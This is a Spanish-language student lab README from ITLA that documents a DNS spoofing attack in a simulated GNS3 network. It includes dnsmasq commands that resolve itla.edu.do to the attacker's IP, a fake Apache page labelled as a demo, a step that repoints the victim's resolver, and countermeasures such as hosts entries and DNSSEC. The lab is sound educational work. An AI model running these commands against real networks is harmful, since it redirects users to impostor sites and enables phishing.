# DNS Spoofing / DNS Poisoning Attack — dnsmasq + Apache2

> **Laboratorio de Seguridad en Redes**  
> **Estudiante:** Ashley Fabian | **Matrícula:** 2025-0773  
> **Institución:** Instituto Tecnológico Las Américas (ITLA)  
> **Herramientas:** GNS3 · Kali Linux · dnsmasq 2.92 · Apache2

---

## 📌 Descripción

Este repositorio contiene los entregables del laboratorio de **DNS Spoofing**, un ataque que falsifica respuestas DNS para redirigir a la víctima hacia un servidor web malicioso. Al consultar `itla.edu.do`, la víctima recibe la IP del atacante (25.7.73.10) en lugar de la IP real, y es redirigida a una página web falsa.

---

## 🗂️ Contenido del Repositorio

```
📁 AshleyFabian_2025-0773_DNS_P2/
├── 📄 README.md
├── 📄 AshleyFabian_2025-0773_Informe_DNS_P2.pdf  ← Documentación técnica
└── 🎬 AshleyFabian_2025-0773_Video_DNS_P2           ← Enlace al video en YouTube
```

---

## 🌐 Topología de Red

```
  [Kali - Atacante]          [Ubuntu - Víctima]
   IP: 25.7.73.10/24          IP: 25.7.73.20/24
   dnsmasq (DNS falso)        DNS: 25.7.73.10
   Apache2 (Web falso)
        |                            |
        +------------+---------------+
                     |
                   [SW1]
              Cisco IOSvL2
                     |
                  [Router]
               IP: 25.7.73.1/24
```

| Equipo | Rol | IP | Máscara |
|--------|-----|----|---------|
| Kali   | Atacante / DNS falso / Web falso | 25.7.73.10 | 255.255.255.0 |
| Ubuntu | Víctima | 25.7.73.20 | 255.255.255.0 |
| Router | Gateway | 25.7.73.1  | 255.255.255.0 |

---

## ⚙️ Requisitos

- Kali Linux con dnsmasq (incluido por defecto) y Apache2
- Ubuntu Desktop como víctima
- Conectividad entre Kali y Ubuntu (mismo segmento de red)
- Puerto 53 UDP/TCP libre en Kali
- Puerto 80 TCP libre en Kali

```bash
# Instalar Apache2 si no está disponible
sudo apt install apache2 -y
```

---

## 🚀 Ejecución del Ataque

### Paso 1 — Configurar DNS falso en Kali

```bash
# Configurar dnsmasq
echo "address=/itla.edu.do/25.7.73.10" | sudo tee /etc/dnsmasq.conf

# Liberar puerto 53
sudo systemctl stop systemd-resolved 2>/dev/null
sudo kill $(sudo lsof -t -i:53) 2>/dev/null

# Iniciar dnsmasq
sudo dnsmasq --conf-file=/etc/dnsmasq.conf --no-daemon &

# Verificar
sudo ss -tulnp | grep 53
```

### Paso 2 — Configurar página web falsa en Kali

```bash
sudo bash -c 'cat > /var/www/html/index.html << EOF
<!DOCTYPE html>
<html>
<head><title>ITLA</title></head>
<body>
  <h1>ITLA - Instituto Tecnologico Las Americas</h1>
  <p style="color:red;">ADVERTENCIA: Esta pagina es FALSA - DNS Spoofing Demo</p>
  <p>Ashley Fabian | 2025-0773</p>
</body>
</html>
EOF'

sudo systemctl start apache2
```

### Paso 3 — Configurar DNS en Ubuntu (víctima)

```bash
echo "nameserver 25.7.73.10" | sudo tee /etc/resolv.conf
```

### Paso 4 — Verificar el ataque desde Ubuntu

```bash
nslookup itla.edu.do
# Resultado esperado:
# Name:    itla.edu.do
# Address: 25.7.73.10   ← DNS SPOOFING EXITOSO

wget -O - http://itla.edu.do
# Resultado esperado: página falsa de ITLA servida desde Kali
```

---

## 🛡️ Contra-Medidas

### Opción 1 — Entrada estática en /etc/hosts (recomendada)

```bash
# En Ubuntu:
echo "149.112.121.20 itla.edu.do" | sudo tee -a /etc/hosts

# Verificar que el spoofing fue bloqueado
nslookup itla.edu.do
# Debe devolver: 149.112.121.20 (IP real), NO 25.7.73.10
```

### Opción 2 — DNSSEC

```bash
# En /etc/systemd/resolved.conf:
[Resolve]
DNSSEC=yes
DNSOverTLS=yes
```

### Resumen

| Contra-medida | Efectividad | Descripción |
|---|---|---|
| /etc/hosts estático | Alta | El SO usa hosts antes que DNS |
| DNSSEC | Alta | Valida firma criptográfica DNS |
| DNS sobre TLS (DoT) | Alta | Cifra consultas DNS |
| DNS sobre HTTPS (DoH) | Alta | DNS dentro de HTTPS |

---

## 🎬 Video

▶️ https://youtu.be/SglH2Bd2eNk?si=8SvpeornIOR3rbU2

> El video muestra el ataque completo y su contra-medida en menos de 5 minutos.

---

## 📄 Documentación

El informe técnico completo se encuentra en:  
📎 `AshleyFabian_2025-0773_Informe_DNS_P2.pdf`

---

## ⚠️ Aviso Legal

Este laboratorio fue realizado en un entorno **completamente controlado y simulado** con GNS3, con fines **exclusivamente educativos**. La ejecución de estos ataques en redes reales sin autorización es **ilegal**.

---

*Ashley Fabian — 2025-0773 — ITLA — Junio 2026*
